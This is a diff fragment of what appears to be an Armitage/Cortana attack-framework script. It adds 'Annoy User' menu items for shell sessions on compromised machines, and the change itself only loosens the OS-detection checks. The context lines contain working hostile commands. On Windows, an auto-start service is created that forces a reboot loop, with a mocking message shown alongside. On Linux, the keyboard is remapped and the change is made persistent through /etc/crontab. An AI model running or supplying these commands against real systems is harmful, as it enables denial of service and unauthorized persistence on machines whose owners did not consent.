@@ -63,7 +63,7 @@ popup meterpreter_bottom {
 
 popup shell {
 	menu "Annoy User" {
-		if (host_os(session_host($1)) eq "Microsoft Windows") {
+		if (host_os(session_host($1)) ismatch ".*Windows.*") {
 			item "Reboot-loop" {
 				s_cmd($1, "sc create rebootLoop binPath= \"C:\\windows\\system32\\shutdown.exe /r /t 0 /f\" start= auto & sc start rebootLoop");
 				show_message("May their services levels soar through the air in the ways that bricks don't.");
@@ -85,7 +85,7 @@ popup shell {
 			}
 		}
 
-		else if (host_os(session_host($1)) eq "Linux") {
+		else if (host_os(session_host($1)) ismatch ".*Linux.*") {
 			item "Change Keboard to Dvorak" {
 				s_cmd($1, "loadkeys dvorak");
 				s_cmd($1, "echo '\@reboot /usr/bin/loadkeys dvorak' >> /etc/crontab");
